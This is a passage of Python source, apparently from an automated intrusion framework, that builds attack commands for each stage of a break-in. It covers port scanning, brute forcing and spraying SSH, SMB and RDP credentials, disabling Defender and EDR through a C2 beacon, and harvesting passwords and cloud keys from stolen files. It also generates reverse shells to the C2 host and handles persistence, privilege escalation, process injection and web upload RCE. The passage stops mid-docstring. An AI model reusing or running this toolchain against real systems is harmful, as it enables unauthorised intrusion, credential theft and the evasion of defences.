+    return "21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1433 1723 2375 2376 3306 3389 5432 5900 5985 6379 6443 8000 8080 8081 8443 8888 9090 27017 49152"
+
+
+def _known_open_ports(wm) -> list:
+    """Ports already seen as open services in the WorldModel (deduped,
+    numeric-sorted). The port scan records WHICH ports are open; the
+    version detection only re-probes those — re-scanning everything
+    burned 4 minutes per wave and always timed out on full sweeps."""
+    out: set = set()
+    for f in wm.find("service"):
+        v = f.value if isinstance(f.value, dict) else {}
+        try:
+            out.add(int(str(v.get("port", "")).split("/")[0]))
+        except (TypeError, ValueError):
+            continue
+    return sorted(out)
+
+
+def _scan_port_spec(wm) -> str:
+    """Port coverage per run profile (stamped on the WorldModel by the
+    agent from the CLI flags):
+      default    -> top-1000, standard rate (nmap's own balanced default:
+                    the ports footholds actually live on, without sweeping
+                    65k ports on every host by default)
+      --stealth  -> full sweep, slow -T2 timing but a BOUNDED rate; the
+                    old unbounded -T2 sweep never reached the high ports
+                    before the 240 s capability timeout
+      --speed    -> top-100 fast (--min-rate 3000)
+      --aggressive-> top-100 fastest (--min-rate 5000)
+    -sV is always on: plain scans label non-standard ports with wrong
+    table guesses (2222 -> "EtherNetIP-1"), which breaks every service
+    precondition downstream (ssh_login needs service == "ssh").
+    An explicit port slot always wins (deep-scan escalation passes
+    1-65535, targeted version detection).
+
+    Every command carries ``--max-retries 1`` and ``--host-timeout`` so a
+    filtered host returns partial results INSIDE the capability timeout:
+    the previous full sweep was killed with no output, the agent classified
+    it as a timeout, and the recovery re-armed the same doomed scan.
+    """
+    style = getattr(wm, "scan_style", "balanced")
+    if style == "top_loud":
+        return ("--top-ports 100 --min-rate 5000 "
+                "--max-retries 1 --host-timeout 120s")
+    if style == "top_fast":
+        return ("--top-ports 100 --min-rate 3000 "
+                "--max-retries 1 --host-timeout 120s")
+    if style == "full_stealth":
+        return ("-p 1-65535 -T3 --min-rate 1000 "
+                "--max-retries 1 --host-timeout 200s")
+    return ("--top-ports 1000 --min-rate 300 "
+            "--max-retries 1 --host-timeout 200s")
+
+
+def _service_port(wm, service: str, default: int = 22) -> int:
+    """The port the scanner actually discovered for a service (SSH on
+    2222, tomcat on 8081 ...); falls back to the well-known port."""
+    for finding in wm.find("service"):
+        value = finding.value if isinstance(finding.value, dict) else {}
+        if str(value.get("service", "")).lower() == service:
+            try:
+                return int(value.get("port"))
+            except (TypeError, ValueError):
+                pass
+    return default
+
+
+def _service_port_any(wm, names, default: int) -> int:
+    """`_service_port` for a service the scanner may label in several ways
+    (SMB ``microsoft-ds``/``netbios-ssn``, RDP ``ms-wbt-server``)."""
+    wanted = {str(n).lower() for n in names}
+    for finding in wm.find("service"):
+        value = finding.value if isinstance(finding.value, dict) else {}
+        if str(value.get("service", "")).lower() in wanted:
+            try:
+                return int(value.get("port"))
+            except (TypeError, ValueError):
+                pass
+    return default
+
+
+def _version_adapter(wm, slots):
+    port = slots.get("port")
+    tool = _chosen_tool(wm, "version_detect", "nmap")
+    # a masscan footprint found OPEN ports but no banners: follow up with
+    # nmap -sV restricted to exactly those ports (the toolbelt stamping
+    # masscan for scan_tcp does not change the version tool)
+    if port:
+        return f"nmap -Pn -sT -sV --version-intensity 2 -p {port} {_effective_target(wm)}"
+    known = _known_open_ports(wm)
+    if known:
+        # only the ports the scan actually found open: fast and precise,
+        # never a second full-range sweep (the old default re-scanned
+        # 1-65535 with -sV and timed out every time)
+        spec = ",".join(str(p) for p in known)
+        return f"nmap -Pn -sT -sV --version-intensity 2 -p {spec} {_effective_target(wm)}"
+    # kill-chain discipline: no known services -> nothing to deepen. A
+    # blind -sV --top-ports here re-scans the host identically to scan_tcp
+    # and produced the operator-visible "version detect -> fail -> version
+    # detect" loop. Degrade to a documented no-op instead: the scan
+    # (scan_tcp) owns the footprint; version_detect only deepens it.
+    return "# no open services known yet — run scan_tcp first"
+
+
+def _raw_socket_ok() -> bool:
+    """True when this process can do raw-socket OS fingerprinting (-O).
+
+    nmap -O needs raw sockets: root on POSIX, and the Npcap/WinPcap packet
+    driver on Windows. Without them the scan FAILS outright ("requires
+    root privileges"), which marked os_detect dead on every unprivileged
+    Windows/macOS operator and inside containers. When unavailable the
+    adapter degrades to banner-based version detection instead.
+    """
+    try:
+        if hasattr(os, "geteuid"):
+            return os.geteuid() == 0
+    except Exception:
+        pass
+    if os.name == "nt":
+        root = os.environ.get("SystemRoot", r"C:\Windows")
+        for rel in (os.path.join("System32", "Npcap", "wpcap.dll"),
+                    os.path.join("System32", "wpcap.dll")):
+            try:
+                if os.path.exists(os.path.join(root, rel)):
+                    return True
+            except OSError:
+                continue
+    return False
+
+
+def _os_adapter(wm, slots):
+    tool = _chosen_tool(wm, "os_detect", "nmap")
+    # Only nmap does remote OS fingerprinting (-O) today; the stamp still
+    # routes so a future implementer (xprobe2) plugs in without a rewrite,
+    # and a missing nmap is recorded as a choice instead of a silent default.
+    if tool == "__internal__":
+        tool = "nmap"
+    target = _effective_target(wm)
+    if tool == "nmap" and not _raw_socket_ok():
+        # no raw sockets here: -O would fail and kill the capability. The
+        # OS is still inferred from banners/version (and the reasoning
+        # layer's os_inferred), so the move keeps its use.
+        return f"{tool} -Pn -sV --version-intensity 5 {target}"
+    return f"{tool} -Pn -O {target}"
+
+
+def _http_probe_adapter(wm, slots):
+    # the DISCOVERED web app, not a guessed port 80
+    url = slots.get("url") or _preferred_url(wm)
+    tool = _chosen_tool(wm, "http_probe", "curl")
+    if tool == "httpx":
+        # httpx is preferred when installed (concurrent prober); the
+        # toolbelt stamps it on the WorldModel. No markdown/color output.
+        return f"httpx -silent -nc -timeout 10 {url}"
+    return f"curl -s -I -m 15 {url}"
+
+
+def _http_get_adapter(wm, slots):
+    url = slots.get("url") or _preferred_url(wm)
+    tool = _chosen_tool(wm, "http_get", "curl")
+    if tool == "wget":
+        return f"wget -q -T 15 -O - {url}"
+    return f"curl -s -m 15 {url}"
+
+
+def _http_get_interp(output: str, wm: WorldModel,
+                     slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: the fetched page/script NAMES the app's own paths.
+
+    P0: the web chain used to probe one hardcoded upload path, so an app
+    that hides its handler at a non-standard route (the hardened-target
+    simulation's `/internal/v2/_dash`) was unreachable by the planner while
+    a human reading the page would find it in seconds. Every reference the
+    document serves becomes a `web_path` finding with its evidence, so the
+    discovery is auditable, reusable (hunt/fuzz consume the same fact) and
+    ordered by the planner instead of hardcoded in a command.
+    """
+    findings: List[Finding] = []
+    if not isinstance(output, str) or not output.strip():
+        return findings
+    findings.append(Finding(
+        kind="web_content", key=f"web_content:{wm.target}",
+        value={"bytes": len(output), "host": _effective_target(wm)},
+        confidence=0.6, source="http_get",
+        evidence=output.strip()[:160], target=wm.target))
+    for path, evidence in _candidate_web_paths(output):
+        findings.append(Finding(
+            kind="web_path", key=f"web_path:{path}",
+            value={"path": path, "host": _effective_target(wm),
+                   "evidence": evidence},
+            # a referenced route is a CANDIDATE, never a confirmed endpoint:
+            # a 404 on the probe is the answer, not a contradiction
+            confidence=0.5, source="http_get",
+            evidence=evidence[:200], target=wm.target))
+    return findings
+
+
+_CURL_PROBE_PORTS = (21, 22, 25, 80, 110, 143, 443, 587, 8000, 8080,
+                     8081, 8443, 8888, 9090)
+_CURL_PROBE_SERVICE = {
+    21: "ftp", 22: "ssh", 25: "smtp", 80: "http", 110: "pop3",
+    143: "imap", 443: "https", 587: "smtp", 8000: "http-alt",
+    8080: "http-alt", 8081: "http-alt", 8443: "https-alt",
+    8888: "http-alt", 9090: "http-alt",
+}
+
+
+def _curl_probe_adapter(wm, slots):
+    """curl-only port/banner sweep (the nmap-less footprint engine).
+
+    `curl telnet://host:port` proves TCP openness on ANY box with curl
+    (Windows/macOS/Linux ship it); `-v` also grabs the banner. Ports
+    come from the slot (default: the banner-grabbing shortlist), one
+    `;`-separated segment each so the no-shell executor and the API
+    gate see plain `curl` invocations. Bounded: 10 ports x 3s worst
+    case, always under the capability timeout.
+    """
+    # A service target (`host:port`) contributes its HOST to the URL and its
+    # port to the sweep: the operator named that service, so it is swept even
+    # when it is not in the shortlist (`8081`, `9443`, ...). The port is
+    # stripped HERE and not in `_bare_host`, because the web adapters depend
+    # on the target keeping its port (a stripped host sent the whole web
+    # phase at `http://127.0.0.1` while the app was on :8081 — every probe
+    # then returned "no output" and the app looked dead).
+    host = split_host_port(_effective_target(wm))[0]
+    own_port = split_host_port(_resolve_target_address(wm))[1]
+    raw = str(slots.get("ports", "") or "")
+    ports = []
+    if own_port:
+        ports.append(own_port)
+    for chunk in raw.replace(",", " ").split():
+        try:
+            port = int(chunk)
+        except ValueError:
+            continue
+        if 1 <= port <= 65535 and port not in ports:
+            ports.append(port)
+    for port in _CURL_PROBE_PORTS:
+        if port not in ports:
+            ports.append(port)
+    segments = []
+    for port in ports[:14]:
+        segments.append(f"echo ==CURLPROBE {port}==")
+        segments.append(
+            f"curl -s -v --max-time 3 telnet://{host}:{port} 2>&1 "
+            f"| head -12")
+    return _join_local_shell(segments)
+
+
+def _curl_probe_interp(output: str, wm: WorldModel,
+                       slots: Dict[str, Any]) -> List[Finding]:
+    """Parse curl telnet sections: 'Connected to' proves the port open
+    (curl exit 52/empty-reply still means OPEN — the verdict comes from
+    the connect marker, never from response bytes); `< ...` lines are
+    the banner. SSH/FTP banners additionally disclose the OS family."""
+    from phantom.automation.belief import Finding
+    findings: List[Finding] = []
+    current: Optional[int] = None
+    connected = False
+    banner_lines: List[str] = []
+    have_service = bool(wm.find("service"))
+
+    def _flush():
+        if current is None or not connected:
+            return
+        label = _CURL_PROBE_SERVICE.get(current)
+        if label and not have_service:
+            # curl-grade service fact (confidence below nmap; same key
+            # so a real scan overwrites it the moment one runs)
+            findings.append(Finding(
+                kind="service", key="tcp/%d" % current,
+                value={"port": str(current), "service": label,
+                       "derived": "curl_probe"},
+                confidence=0.55, source="curl_probe", target=wm.target))
+        for line in banner_lines[:4]:
+            findings.append(Finding(
+                kind="banner", key="tcp/%d" % current,
+                value={"port": str(current), "banner": line[:200]},
+                confidence=0.6, source="curl_probe", target=wm.target))
+        low = " ".join(banner_lines).lower()
+        os_name = ""
+        if "openssh" in low and ("debian" in low or "ubuntu" in low):
+            os_name = "Linux"
+        elif "openssh" in low:
+            os_name = "Linux/Unix"
+        elif "microsoft" in low:
+            os_name = "Windows"
+        if os_name:
+            findings.append(Finding(
+                kind="os", key="os",
+                value={"name": os_name, "derived": "curl_probe"},
+                confidence=0.5, source="curl_probe", target=wm.target))
+
+    for raw_line in (output or "").splitlines():
+        line = raw_line.strip()
+        if line.startswith("==CURLPROBE") and line.endswith("=="):
+            _flush()
+            try:
+                current = int(line.strip("=").split()[1])
+            except (IndexError, ValueError):
+                current = None
+            connected = False
+            banner_lines = []
+            continue
+        if current is None:
+            continue
+        if "Connected to" in line:
+            connected = True
+            continue
+        if line.startswith("<") and len(line) > 2:
+            banner_lines.append(line[1:].strip())
+    _flush()
+    return findings
+
+
+def _smb_enum_adapter(wm, slots):
+    host = slots.get("host", _effective_target(wm))
+    tool = _chosen_tool(wm, "smb_enum", "smbmap")
+    if tool == "enum4linux":
+        return f"enum4linux -a {host}"
+    if tool == "nmap":
+        # zero-extra-tooling fallback: the shares/smb scripts ship with nmap
+        return (f"nmap -Pn -p 445 --script smb-enum-shares,smb-enum-users "
+                f"{host}")
+    return f"smbmap -H {host}"
+
+
+def _redis_info_adapter(wm, slots):
+    host = _effective_target(wm)
+    port = slots.get("port", "6379")
+    tool = _chosen_tool(wm, "redis_info", "redis-cli")
+    if tool == "nc":
+        # zero-dependency floor: Redis speaks the RESP inline protocol, a
+        # bare INFO\r\n over TCP returns the info block without redis-cli
+        return (f"printf 'INFO\\r\\n' | nc -w 5 {host} {port} "
+                f"2>/dev/null | head -c 2000")
+    return f"redis-cli -h {host} -p {port} info"
+
+
+_SSH_BANNER_CACHE: Dict[Tuple[str, int], Tuple[float, str]] = {}
+
+
+def _internal_ssh_banner(host: str, port: int, ttl: float = 120.0) -> str:
+    """In-process SSH banner grab, memoised per (host, port) for the run.
+
+    The adapter can be asked for the same banner more than once (chain
+    preview, then execution); the probe is a live socket, so the second ask
+    returns the cached line instead of opening the socket again.
+    """
+    import time
+    key = (host, int(port))
+    now = time.time()
+    hit = _SSH_BANNER_CACHE.get(key)
+    if hit and now - hit[0] < ttl:
+        return hit[1]
+    from phantom.automation.fingerprint.probes import FingerprintEngine
+    r = FingerprintEngine(timeout=5.0).probe(host, port, service="ssh")
+    if r is None:
+        out = f"# internal ssh banner: no response from {host}:{port}"
+    elif not r.ok:
+        out = (f"# internal ssh banner: {r.error or 'no SSH banner'} "
+               f"on {host}:{port}")
+    elif not r.product:
+        out = (f"# internal ssh banner: connected but no SSH banner "
+               f"on {host}:{port}")
+    else:
+        out = f"FINGERPRINT:{r.port}:ssh:{r.product}:{r.version or '?'}"
+    _SSH_BANNER_CACHE[key] = (now, out)
+    return out
+
+
+def _ssh_banner_adapter(wm, slots):
+    tool = _chosen_tool(wm, "ssh_banner", "nc")
+    if tool == "__internal__":
+        # pure-socket banner grab through the fingerprint engine — works
+        # with NO external binary installed and (critically) never emits
+        # the noisy 'nc at a closed port' failure: closed ports return a
+        # clean comment line the agent marks as self-sufficient. Memoised:
+        # the socket is opened at most once per (host, port) per run.
+        host = _effective_target(wm)
+        port = int(slots.get("port") or _service_port(wm, "ssh", 22))
+        return _internal_ssh_banner(host, port)
+    return f"nc -w 5 {_effective_target(wm)} {slots.get('port', '22')}"
+
+
+def _ssh_login_adapter(wm, slots):
+    user, pw = slots["username"], slots["password"]
+    port = _service_port(wm, "ssh")
+    return (f"sshpass -p {pw} ssh -p {port} -o StrictHostKeyChecking=no "
+            f"-o ConnectTimeout=10 {user}@{_effective_target(wm)} 'id'")
+
+
+def _web_creds_adapter(wm, slots):
+    """Adapter: run the deterministic web→credentials engine on all web
+    services; returns WEBCREDS: marker lines the interpreter parses."""
+    from phantom.automation.exploit.webcreds import run_web_creds_dump
+    host, port = _web_service_target(wm)
+    # Keep the port in the target: the engine splits it off as explicit
+    # intent, so a non-standard web port is probed even when the scan did
+    # not classify it as web.
+    creds = run_web_creds_dump(wm, f"{host}:{port}" if port else host)
+    if not creds:
+        return "# web credential extraction found no credentials"
+    return "\n".join(c.marker() for c in creds)
+
+
+def _web_creds_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: parse WEBCREDS: markers into validated creds findings."""
+    findings = []
+    for line in output.split("\n"):
+        line = line.strip()
+        if not line.startswith("WEBCREDS:"):
+            continue
+        parts = line.split(":")
+        if len(parts) < 5:
+            continue
+        user, pw, port, method = parts[1], parts[2], parts[3], parts[4]
+        confidence = 0.7
+        try:
+            confidence = float(parts[5]) if len(parts) > 5 else 0.7
+        except ValueError:
+            pass
+        findings.append(Finding(
+            kind="creds", key=f"web:{user}",
+            value={"username": user, "password": pw, "service": "",
+                   "valid": True, "method": f"web_{method}",
+                   "port": port},
+            confidence=min(confidence, 0.9), source="web_creds",
+            target=wm.target))
+    return findings
+
+
+def _brute_words(service: str) -> tuple:
+    """(users, passwords) for an online brute: the built-in default set for
+    the service plus any operator wordlists, de-duplicated in order."""
+    from phantom.utils.rce_deployer import DEFAULT_CREDENTIALS
+    users: List[str] = []
+    passwords: List[str] = []
+    for u, p in DEFAULT_CREDENTIALS.get(service, []):
+        if u not in users:
+            users.append(u)
+        if p and p not in passwords:
+            passwords.append(p)
+    try:
+        from phantom.automation.exploit.vectors import load_custom_wordlists
+        extra_u, extra_p = load_custom_wordlists(service)
+        users.extend(u for u in extra_u if u not in users)
+        passwords.extend(p for p in extra_p if p not in passwords)
+    except Exception:
+        pass
+    return users, passwords
+
+
+def _brute_wordlist_files(users: List[str], passwords: List[str],
+                          tag: str) -> tuple:
+    """Write the user/pass files a cracker reads and return (users, pass)."""
+    import tempfile
+    tmp = tempfile.mkdtemp(prefix=f"phantom_brute_{tag}_")
+    uf = os.path.join(tmp, "users.txt")
+    pf = os.path.join(tmp, "pass.txt")
+    with open(uf, "w", encoding="utf-8") as fh:
+        fh.write("\n".join(users) + "\n")
+    with open(pf, "w", encoding="utf-8") as fh:
+        fh.write("\n".join(passwords) + "\n")
+    return uf, pf
+
+
+def _brute_adapter(wm, capability: str, service: str, medusa_module: str,
+                   hydra_url: str, port: int):
+    """One online brute adapter for every protocol.
+
+    Windows boxes answer on SMB/RDP and nothing else — no ssh, no web — so
+    `brute_ssh` alone left those hosts with NO creds source and the planner
+    with no plan at all. Same bounded shape for all of them: default
+    credential set + operator wordlists, `-f` stop-on-first-hit.
+    """
+    tool = _chosen_tool(wm, capability, "hydra")
+    host = _effective_target(wm)
+    users, passwords = _brute_words(service)
+    if not users or not passwords:
+        return f"# {capability}: empty wordlists (no defaults, no custom lists)"
+    uf, pf = _brute_wordlist_files(users, passwords, capability)
+    if tool == "medusa":
+        return f"medusa -h {host} -n {port} -M {medusa_module} -U {uf} -P {pf} -t 4 -f"
+    return f"hydra -L {uf} -P {pf} -t 4 -W 3 -f -s {port} {hydra_url.format(host=host, port=port)}"
+
+
+def _brute_ssh_adapter(wm, slots):
+    """Adapter: online SSH brute force with the toolbelt's chosen cracker
+    (hydra > medusa). Bounded via `-f` stop-on-first-hit."""
+    return _brute_adapter(wm, "brute_ssh", "ssh", "ssh",
+                          "ssh://{host}:{port}", _service_port(wm, "ssh"))
+
+
+def _brute_smb_adapter(wm, slots):
+    """Adapter: online SMB brute force (hydra > medusa)."""
+    port = _service_port_any(wm, ("microsoft-ds", "netbios-ssn", "smb"), 445)
+    return _brute_adapter(wm, "brute_smb", "smb", "smbnt",
+                          "smb://{host}", port)
+
+
+def _brute_rdp_adapter(wm, slots):
+    """Adapter: online RDP brute force (hydra > medusa)."""
+    port = _service_port_any(wm, ("ms-wbt-server", "rdp"), 3389)
+    return _brute_adapter(wm, "brute_rdp", "rdp", "rdp",
+                          "rdp://{host}", port)
+
+
+def _parse_brute_creds(output: str, wm: WorldModel, *, service: str,
+                       key_prefix: str, source: str, port: int) -> List[Finding]:
+    """Parse hydra ('login: x password: y') and medusa ('[SUCCESS] ...
+    User: x, Password: y') success lines into creds findings."""
+    findings: List[Finding] = []
+    for line in output.splitlines():
+        user = pw = ""
+        if "login:" in line and "password:" in line:
+            try:
+                user = line.split("login:")[1].split()[0].strip()
+                pw = line.split("password:")[1].split()[0].strip()
+            except (IndexError, ValueError):
+                continue
+        elif "[SUCCESS]" in line and "User:" in line and "Password:" in line:
+            try:
+                mu = re.search(r"User:\s*([^\s,()]+)", line)
+                mp = re.search(r"Password:\s*([^\s,()\[\]]+)", line)
+                user = mu.group(1).strip() if mu else ""
+                pw = mp.group(1).strip() if mp else ""
+            except (IndexError, ValueError):
+                continue
+        if not user or not pw:
+            continue
+        findings.append(Finding(
+            kind="creds", key=f"{key_prefix}:{user}",
+            value={"username": user, "password": pw, "service": service,
+                   "valid": True, "method": "online_brute", "port": port},
+            confidence=0.85, source=source, target=wm.target))
+    return findings
+
+
+def _brute_ssh_interp(output: str, wm: WorldModel,
+                      slots: Dict[str, Any]) -> List[Finding]:
+    return _parse_brute_creds(output, wm, service="ssh", key_prefix="ssh",
+                              source="brute_ssh",
+                              port=_service_port(wm, "ssh"))
+
+
+def _brute_smb_interp(output: str, wm: WorldModel,
+                      slots: Dict[str, Any]) -> List[Finding]:
+    return _parse_brute_creds(
+        output, wm, service="smb", key_prefix="smb", source="brute_smb",
+        port=_service_port_any(wm, ("microsoft-ds", "netbios-ssn", "smb"), 445))
+
+
+def _brute_rdp_interp(output: str, wm: WorldModel,
+                      slots: Dict[str, Any]) -> List[Finding]:
+    return _parse_brute_creds(
+        output, wm, service="rdp", key_prefix="rdp", source="brute_rdp",
+        port=_service_port_any(wm, ("ms-wbt-server", "rdp"), 3389))
+
+
+def _cred_spray_adapter(wm, slots):
+    """Adapter: build the lockout-safe spray rounds (one password per
+    round, attempt-cap enforced by the ledger) and emit the hydra
+    commands. The engine owns the plan; the adapter renders it."""
+    from phantom.automation.guidance.spray import (SprayLedger, plan_spray,
+                                                   sprayable_services,
+                                                   harvested_creds)
+    ledger = SprayLedger()
+    rounds = plan_spray(wm, ledger, host=_effective_target(wm))
+    if not rounds:
+        if not sprayable_services(wm):
+            return ("# cred_spray: no sprayable service open "
+                    "(ssh/ftp/mysql/postgres/smb/tomcat/redis)")
+        if not harvested_creds(wm):
+            return ("# cred_spray: no credential material yet — harvest "
+                    "creds or run OSINT first")
+        return ("# cred_spray: every account is at the attempt cap "
+                "(lockout protection)")
+    out = [f"# cred_spray: {len(rounds)} lockout-safe round(s), "
+           f"{ledger.summary()['attempts']} planned attempts, "
+           f"cap={ledger.max_attempts}/account"]
+    for r in rounds:
+        out.append(r.hydra_command())
+    return "\n".join(out)
+
+
+def _cred_spray_interp(output: str, wm: WorldModel,
+                       slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: parse spray success lines into cross-service creds,
+    recording the service they authenticated against."""
+    from phantom.automation.guidance.spray import parse_spray_output
+    findings: List[Finding] = []
+    for service, host, user, pw in parse_spray_output(output):
+        if not user or not pw:
+            continue
+        findings.append(Finding(
+            kind="creds", key=f"spray:{user}@{host or wm.target}",
+            value={"username": user, "password": pw,
+                   "service": service, "valid": True,
+                   "method": "lockout_aware_spray",
+                   "port": _service_port(wm, service) if service else ""},
+            confidence=0.9, source="cred_spray", target=wm.target))
+    return findings
+
+
+def _edr_disable_adapter(wm, slots):
+    """Adapter: the command shipped to the beacon is `edr-kill` (the
+    beacon-side module disables Defender + stops known AV/EDR services).
+    Executed through the C2 task channel like any post capability."""
+    return "edr-kill"
+
+
+def _edr_disable_interp(output: str, wm: WorldModel,
+                        slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: confirm the defensive stack was actually touched.
+    The output lists stopped services / defender status; a run that
+    stopped nothing (no privileges, Tamper Protection) must NOT produce
+    a success finding — the planner then knows the gap is still there."""
+    lines = (output or "").splitlines()
+    # both the Windows (`stopped <svc>`) and the Linux pkill fallback
+    # (`killed <daemon>`) count as a real defensive gap.
+    stopped = [l for l in lines if l.startswith("stopped ") or l.startswith("killed ")]
+    defender_off = "disabled" in (output or "").lower()
+    detected = [l for l in lines if l.startswith("  found ")]
+    if not stopped and not defender_off:
+        return []
+    detail = ", ".join(s.split()[1] for s in stopped[:8]) if stopped else ""
+    if not detail and defender_off:
+        detail = ", ".join(d.strip().split(" ", 1)[-1] for d in detected[:8])
+    findings = [Finding(
+        kind="defensive_gap", key="av_edr:disabled",
+        value={"status": "disabled",
+               "stopped": detail or "defender-realtime",
+               "method": "edr-kill"},
+        confidence=0.7, source="edr_disable", target=wm.target)]
+    return findings
+
+
+def _loot_triage_adapter(wm, slots):
+    """Adapter: run the loot triage engine on the downloads dir and emit
+    LOOT: marker lines the interpreter turns into findings."""
+    from phantom.automation.loot import scan_dir
+    from phantom.utils.paths import data_dir
+    import os
+    loot_dir = os.path.join(data_dir(), "downloads")
+    report = scan_dir(loot_dir)
+    if report.files_seen == 0:
+        return "# loot_triage: no downloaded files to triage yet — use " \
+               "the beacon `download` command first"
+    lines = [f"# loot_triage: {report.files_seen} file(s) scanned, "
+             f"{len(report.hits)} secret(s) extracted"]
+    for h in report.hits[:30]:
+        lines.append(f"LOOT:{h.label}:{h.value}:{h.path}:{h.line}")
+    for step in report.next_steps[:10]:
+        lines.append(f"LOOT_STEP:{step}")
+    return "\n".join(lines)
+
+
+def _loot_triage_interp(output: str, wm: WorldModel,
+                        slots: Dict[str, Any]) -> List[Finding]:
+    """Interpreter: parse LOOT: markers into creds/cloud_creds findings
+    with provenance, and LOOT_STEP: lines into a reusable next_step fact."""
+    findings: List[Finding] = []
+    for line in output.splitlines():
+        line = line.strip()
+        if line.startswith("LOOT_STEP:"):
+            advice = line[len("LOOT_STEP:"):].strip()
+            if advice:
+                findings.append(Finding(
+                    kind="next_step", key=f"loot:{advice[:48]}",
+                    value={"advice": advice, "source": "loot_triage"},
+                    confidence=0.6, source="loot_triage", target=wm.target))
+            continue
+        if not line.startswith("LOOT:"):
+            continue
+        parts = line[len("LOOT:"):].split(":")
+        if len(parts) < 4:
+            continue
+        label, value, path = parts[0], parts[1], parts[2]
+        try:
+            line_no = int(parts[3])
+        except (TypeError, ValueError):
+            line_no = 0
+        provenance = f"{path}:{line_no}"
+        if label in ("password_literal", "password_value", "dotnet_dsn",
+                     "db_password"):
+            findings.append(Finding(
+                kind="creds", key=f"loot:{label}:{value[:24]}",
+                value={"username": "", "password": value, "service": "",
+                       "valid": False, "method": "loot_extraction",
+                       "provenance": provenance},
+                confidence=0.6, source="loot_triage", target=wm.target))
+        elif label in ("aws_access_key", "aws_secret_key", "aws_temp_key",
+                       "gcp_service_account", "google_api_key"):
+            findings.append(Finding(
+                kind="cloud_creds", key=f"loot:{label}",
+                value={"kind": label, "provenance": provenance},
+                confidence=0.7, source="loot_triage", target=wm.target))
+        elif label == "ssh_host":
+            findings.append(Finding(
+                kind="host", key=f"loot-host:{value}",
+                value={"ip": value, "source": "loot"},
+                confidence=0.5, source="loot_triage", target=wm.target))
+    return findings
+
+
+def _payload_reverse_adapter(wm, slots):
+    """Reverse shell payload for the target platform.
+
+    lhost defaults to the operator's C2 endpoint; dialect defaults to the
+    engine's best-first order for the platform. Returns a PAYLOAD: marker
+    line the interpreter parses into a shell_foothold finding.
+    """
+    from phantom.automation.brain.payload import PayloadEngine
+    from phantom.utils.network import get_c2_endpoint
+    platform = _target_os(wm).lower() or "linux"
+    try:
+        lhost = slots.get("lhost") or get_c2_endpoint()[0]
+        lport = int(slots.get("lport") or get_c2_endpoint()[1] + 1)
+    except Exception:
+        lhost = slots.get("lhost") or "127.0.0.1"
+        lport = int(slots.get("lport") or 4444)
+    p = PayloadEngine().reverse(platform, lhost, lport,
+                                dialect=slots.get("dialect"))
+    return p.marker()
+
+
+def _payload_bind_adapter(wm, slots):
+    """Bind shell payload (aggressive-only; the agent gates the flag)."""
+    from phantom.automation.brain.payload import PayloadEngine
+    platform = _target_os(wm).lower() or "linux"
+    port = int(slots.get("port") or 4444)
+    p = PayloadEngine().bind(platform, port, dialect=slots.get("dialect"))
+    return p.marker()
+
+
+def _payload_interp(output: str, wm: WorldModel,
+                    slots: Dict[str, Any]) -> List[Finding]:
+    """Parse PAYLOAD: markers into a shell_foothold finding (the payload
+    command is the foothold the caller ships to the target)."""
+    findings = []
+    for line in (output or "").splitlines():
+        if not line.startswith("PAYLOAD:"):
+            continue
+        parts = line.split("cmd=", 1)
+        if len(parts) < 2:
+            continue
+        meta = parts[0].split(":")
+        if len(meta) < 4:
+            continue
+        kind, platform, dialect = meta[1], meta[2], meta[3]
+        findings.append(Finding(
+            kind="shell_foothold", key=f"{kind}:{dialect}",
+            value={"kind": kind, "platform": platform, "dialect": dialect,
+                   "command": parts[1].strip()},
+            confidence=0.9, source="payload", target=wm.target))
+    return findings
+
+
+def _beacon_adapter(wm, slots):
+    return slots["command"]
+
+
+def _persist_adapter(wm, slots):
+    from phantom.automation.post.persistence import (
+        windows_persist_command, linux_persist_command)
+    os_name = slots.get("os") or _target_os(wm)
+    payload = slots.get("payload") or _beacon_payload(wm)
+    method = slots.get("method") or (
+        "runkey" if "windows" in os_name.lower() else "cron")
+    if "windows" in os_name.lower():
+        return windows_persist_command(method, payload)
+    return linux_persist_command(method, payload)
+
+
+def _internal_recon_adapter(wm, slots):
+    """Internal network snapshot FROM THE BEACON: interfaces, default
+    route (gateway), ARP neighbors. The raw material every operator
+    walks before choosing a lateral-movement target."""
+    from phantom.automation.post.internal_recon import (
+        internal_snapshot_command)
+    os_name = slots.get("os") or _target_os(wm)
+    return internal_snapshot_command(os_name)
+
+
+def _internal_probe_adapter(wm, slots):
+    """Bounded TCP probe of the discovered internal neighbors for the
+    pivot services (SSH/SMB/WinRM). Scope is checked FIRST: neighbors
+    outside the engagement scope are never probed."""
+    from phantom.automation.post.internal_recon import (
+        internal_probe_command, internal_peers_in_scope)
+    hosts = internal_peers_in_scope(wm, _current_scope())
+    if not hosts:
+        raise ValueError("no in-scope internal hosts to probe")
+    return internal_probe_command(hosts)
+
+
+def _current_scope() -> List[str]:
+    """The engagement scope list (session-level), for the internal probe's
+    authorization gate. An ARP neighbor is knowledge, not authorization."""
+    try:
+        from phantom.core.session import session
+        return list(session.scope or [])
+    except Exception:
+        return []
+
+
+def _privesc_adapter(wm, slots):
+    from phantom.automation.post.privesc import system_escalation_command
+    os_name = slots.get("os") or _target_os(wm)
+    payload = slots.get("payload") or _beacon_payload(wm)
+    return system_escalation_command(os_name, payload)
+
+
+def _inject_adapter(wm, slots):
+    from phantom.automation.post.inject import inject_beacon_command
+    os_name = slots.get("os") or _target_os(wm)
+    payload = slots.get("payload") or _beacon_payload(wm)
+    proc = slots.get("target_process", "winlogon")
+    return inject_beacon_command(os_name, payload, target_process=proc)
+
+
+def _web_service_target(wm):
+    """(host, port) of the REAL web app to attack.
+
+    The explicit port in the target (`host:8081`, `host:9443`) is INTENT and
+    wins; otherwise use the port the scan actually fingerprinted, from ANY
+    port (not a shortlist of "standard" ones); 80 is only the last resort.
+    The operator's own local C2 listener is still excluded.
+    """
+    host = _effective_target(wm)
+    own_port = split_host_port(_resolve_target_address(wm))[1]
+    c2_port = _c2_port_blocks(host) or None
+    if own_port and str(own_port) != c2_port:
+        return host, str(own_port)
+    discovered = _discovered_web_port(wm)
+    if discovered and discovered != c2_port:
+        return host, discovered
+    return host, "80"
+
+
+def _web_rce_adapter(wm, slots):
+    """Arbitrary-file-upload -> RCE probe on a discovered web app.
+
+    POSTs a tiny python script that prints a unique marker; if the app
+    executes uploaded .py files (real report-generator RCE), the response
+    contains the marker and we own the box without any credentials.
